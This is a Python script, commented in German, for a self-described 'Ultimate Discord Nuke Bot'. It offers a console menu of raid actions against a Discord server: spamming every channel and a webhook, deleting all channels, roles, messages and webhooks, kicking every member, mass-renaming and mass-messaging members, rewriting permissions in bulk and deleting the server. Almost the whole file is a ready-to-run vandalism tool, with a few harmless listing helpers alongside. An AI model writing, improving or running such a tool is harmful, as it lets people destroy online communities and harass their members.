import discord
from discord.ext import commands
import aiohttp
import random

# Bot initialisieren
intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)

# Funktion zum Abrufen des Bot-Tokens und der Server-ID
def get_bot_token_and_server_id():
    token = input("Enter your bot token: ")
    server_id = int(input("Enter your server ID: "))
    return token, server_id

# Funktion für Design und Titel
def print_title():
    print("\n" + "="*60)
    print(" "*15 + "Ultimate Discord Nuke Bot")
    print("="*60)

# Funktion für das Menü in einer Box (links und rechts aufgeteilt)
def print_menu():
    print("\n+------------------------------------------------------------+")
    print("|                       Available Options                    |")
    print("+------------------------------+-----------------------------+")
    print("|  1.  Spam Channels            | 16. Notify All Members      |")
    print("|  2.  Nuke Server              | 17. Update Server Banner    |")
    print("|  3.  Create Channels          | 18. Add Custom Emojis       |")
    print("|  4.  Delete Channels          | 19. Clear Server            |")
    print("|  5.  Update Server Icon       | 20. Empty Server            |")
    print("|  6.  Delete Webhook           | 21. List All Members        |")
    print("|  7.  Delete All Webhooks      | 22. List All Channels       |")
    print("|  8.  Show Server Info         | 23. List All Emojis         |")
    print("|  9.  Rename All Members       | 24. Create Categories       |")
    print("| 10. Delete All Messages       | 25. List All Webhooks       |")
    print("| 11. Show All Roles            | 26. List All Threads        |")
    print("| 12. Server Settings           | 27. Bulk Update Channel     |")
    print("| 13. Change Channel Description|     Permissions             |")
    print("| 14. Remove Bots               | 28. Bulk Update Role        |")
    print("| 15. Delete Server             |     Permissions             |")
    print("+------------------------------+-----------------------------+")
    print("| 29. Custom Function 5         | 31. Create Threads          |")
    print("| 30. Spam Webhook              | 32. Exit                    |")
    print("+------------------------------------------------------------+")

# Funktion für das Hauptmenü
async def menu():
    print_title()
    print_menu()
    
    option = input("\nPlease choose an option (1-32): ")
    guild = bot.get_guild(int(input("Enter your server ID: ")))

    if option == "1":
        await spam_channels(guild)
    elif option == "2":
        await nuke_server(guild)
    elif option == "3":
        await create_channels(guild)
    elif option == "4":
        await delete_channels(guild)
    elif option == "5":
        await update_server_icon(guild)
    elif option == "6":
        await delete_webhook(guild)
    elif option == "7":
        await delete_all_webhooks(guild)
    elif option == "8":
        await server_info(guild)
    elif option == "9":
        await rename_all_members(guild)
    elif option == "10":
        await delete_all_messages(guild)
    elif option == "11":
        await show_all_roles(guild)
    elif option == "12":
        await server_settings(guild)
    elif option == "13":
        await change_channel_description(guild)
    elif option == "14":
        await remove_bots(guild)
    elif option == "15":
        await delete_server(guild)
    elif option == "16":
        await notify_all_members(guild)
    elif option == "17":
        await update_server_banner(guild)
    elif option == "18":
        await add_custom_emojis(guild)
    elif option == "19":
        await clear_server(guild)
    elif option == "20":
        await empty_server(guild)
    elif option == "21":
        await list_all_members(guild)
    elif option == "22":
        await list_all_channels(guild)
    elif option == "23":
        await list_all_emojis(guild)
    elif option == "24":
        await create_categories(guild)
    elif option == "25":
        await list_all_webhooks(guild)
    elif option == "26":
        await list_all_threads(guild)
    elif option == "27":
        await bulk_update_channel_permissions(guild)
    elif option == "28":
        await bulk_update_role_permissions(guild)
    elif option == "29":
        await custom_function_5(guild)
    elif option == "30":
        await spam_webhook()
    elif option == "31":
        await create_threads(guild)
    elif option == "32":
        print("Exiting...")
        return
    else:
        print("Invalid option.")
    
    await menu()

# Funktion zum Spam in allen Kanälen
async def spam_channels(guild):
    message = input("Enter the message to spam: ")
    count = int(input("How many times per channel: "))
    for channel in guild.text_channels:
        for _ in range(count):
            await channel.send(message)

# Funktion zum Nuke des Servers
async def nuke_server(guild):
    if input("Delete all channels? (Y/N): ").upper() == 'Y':
        await delete_channels(guild)
    if input("Spam channels? (Y/N): ").upper() == 'Y':
        await spam_channels(guild)
    if input("Delete server? (Y/N): ").upper() == 'Y':
        await delete_server(guild)

# Funktion zum Erstellen von Kanälen
async def create_channels(guild):
    name = input("Enter the name of the channel: ")
    count = int(input("How many channels to create: "))
    for _ in range(count):
        await guild.create_text_channel(name)

# Funktion zum Löschen von Kanälen
async def delete_channels(guild):
    for channel in guild.channels:
        await channel.delete()

# Funktion zum Aktualisieren des Server-Icons
async def update_server_icon(guild):
    url = input("Enter the URL for the new server icon: ")
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status == 200:
                data = await resp.read()
                await guild.edit(icon=data)

# Funktion zum Löschen eines Webhooks
async def delete_webhook(guild):
    webhook_id = int(input("Enter the webhook ID to delete: "))
    webhook = await bot.fetch_webhook(webhook_id)
    await webhook.delete()

# Funktion zum Löschen aller Webhooks im Server
async def delete_all_webhooks(guild):
    webhooks = await guild.webhooks()
    for webhook in webhooks:
        await webhook.delete()

# Funktion zum Anzeigen von Server-Informationen
async def server_info(guild):
    info = (
        f"Server Name: {guild.name}\n"
        f"Server ID: {guild.id}\n"
        f"Owner: {guild.owner}\n"
        f"Member Count: {guild.member_count}\n"
        f"Region: {guild.region}\n"
    )
    print(info)

# Funktion zum Umbenennen aller Mitglieder
async def rename_all_members(guild):
    new_name = input("Enter the new name for all members: ")
    for member in guild.members:
        await member.edit(nick=new_name)

# Funktion zum Löschen aller Nachrichten in allen Kanälen
async def delete_all_messages(guild):
    for channel in guild.text_channels:
        await channel.purge()

# Funktion zum Anzeigen aller Rollen
async def show_all_roles(guild):
    for role in guild.roles:
        print(f"Role: {role.name}, ID: {role.id}")

# Funktion zum Anzeigen von Server-Einstellungen
async def server_settings(guild):
    settings = (
        f"Verification Level: {guild.verification_level}\n"
        f"Default Notifications: {guild.default_notifications}\n"
        f"Explicit Content Filter: {guild.explicit_content_filter}\n"
    )
    print(settings)

# Funktion zum Ändern der Kanalbeschreibung
async def change_channel_description(guild):
    channel_id = int(input("Enter the channel ID: "))
    new_description = input("Enter the new description: ")
    channel = guild.get_channel(channel_id)
    await channel.edit(topic=new_description)

# Funktion zum Entfernen von Bots
async def remove_bots(guild):
    for member in guild.members:
        if member.bot:
            await member.kick()

# Funktion zum Löschen des Servers
async def delete_server(guild):
    await guild.delete()

# Funktion zum Benachrichtigen aller Mitglieder
async def notify_all_members(guild):
    message = input("Enter the message to notify all members: ")
    for member in guild.members:
        try:
            await member.send(message)
        except discord.Forbidden:
            print(f"Could not message {member.name}")

# Funktion zum Aktualisieren des Server-Banners
async def update_server_banner(guild):
    url = input("Enter the URL for the new server banner: ")
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status == 200:
                data = await resp.read()
                await guild.edit(banner=data)

# Funktion zum Hinzufügen benutzerdefinierter Emojis
async def add_custom_emojis(guild):
    emoji_name = input("Enter the name of the new emoji: ")
    emoji_url = input("Enter the URL for the emoji image: ")
    async with aiohttp.ClientSession() as session:
        async with session.get(emoji_url) as resp:
            if resp.status == 200:
                data = await resp.read()
                await guild.create_custom_emoji(name=emoji_name, image=data)

# Funktion zum Leeren des Servers (alle Kanäle und Rollen löschen)
async def clear_server(guild):
    await delete_channels(guild)
    for role in guild.roles:
        try:
            await role.delete()
        except:
            pass

# Funktion zum Leeren des Servers (alle Mitglieder entfernen)
async def empty_server(guild):
    for member in guild.members:
        try:
            await member.kick()
        except:
            pass

# Funktion zum Auflisten aller Mitglieder
async def list_all_members(guild):
    for member in guild.members:
        join_date = member.joined_at.strftime("%Y-%m-%d %H:%M:%S")
        print(f"Join Date: {join_date} - ID: {member.id} - User: {member.name}")

# Funktion zum Auflisten aller Kanäle
async def list_all_channels(guild):
    for channel in guild.channels:
        print(f"Channel Name: {channel.name}, ID: {channel.id}")

# Funktion zum Auflisten aller Emojis
async def list_all_emojis(guild):
    for emoji in guild.emojis:
        print(f"Emoji: {emoji.name}, ID: {emoji.id}")

# Funktion zum Erstellen von Kategorien
async def create_categories(guild):
    name = input("Enter the name of the category: ")
    await guild.create_category(name)

# Funktion zum Auflisten aller Webhooks
async def list_all_webhooks(guild):
    webhooks = await guild.webhooks()
    for webhook in webhooks:
        print(f"Webhook Name: {webhook.name}, ID: {webhook.id}")

# Funktion zum Auflisten aller Threads
async def list_all_threads(guild):
    for thread in guild.threads:
        print(f"Thread Name: {thread.name}, ID: {thread.id}")

# Funktion zum Mass-Updaten von Kanalberechtigungen
async def bulk_update_channel_permissions(guild):
    permission_name = input("Enter the permission to update: ")
    value = input("Allow or deny? (allow/deny): ").lower() == 'allow'
    for channel in guild.channels:
        for overwrite in channel.overwrites:
            perms = channel.overwrites_for(overwrite)
            setattr(perms, permission_name, value)
            await channel.set_permissions(overwrite, overwrite=perms)

# Funktion zum Mass-Updaten von Rollenberechtigungen
async def bulk_update_role_permissions(guild):
    permission_name = input("Enter the permission to update: ")
    value = input("Allow or deny? (allow/deny): ").lower() == 'allow'
    for role in guild.roles:
        perms = role.permissions
        setattr(perms, permission_name, value)
        await role.edit(permissions=perms)

# Custom Function 5
async def custom_function_5(guild):
    # Placeholder für benutzerdefinierte Funktion
    print("Custom Function 5 executed!")

# Funktion zum Spam über einen Webhook
async def spam_webhook():
    webhook_url = input("Enter the webhook URL: ")
    message = input("Enter the message to spam: ")
    count = int(input("How many times to send the message: "))
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(webhook_url, adapter=discord.AsyncWebhookAdapter(session))
        for _ in range(count):
            await webhook.send(message)

# Funktion zum Erstellen von Threads
async def create_threads(guild):
    for channel in guild.text_channels:
        title = input(f"Enter a title for a thread in {channel.name}: ")
        await channel.create_thread(name=title)

# Startet den Bot
token, server_id = get_bot_token_and_server_id()
bot.run(token)
